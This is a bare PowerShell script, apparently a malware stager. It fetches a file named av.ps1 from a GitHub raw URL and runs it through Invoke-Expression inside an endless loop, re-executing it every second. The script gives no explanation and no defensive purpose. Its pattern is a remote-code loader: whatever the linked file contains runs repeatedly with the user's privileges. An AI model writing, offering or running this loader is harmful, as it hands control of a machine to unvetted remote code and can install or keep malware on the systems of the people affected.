$content = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/43a1723/test/main/output/av.ps1"
while ($true) {
    iex $content
    Start-Sleep -Seconds 1
}
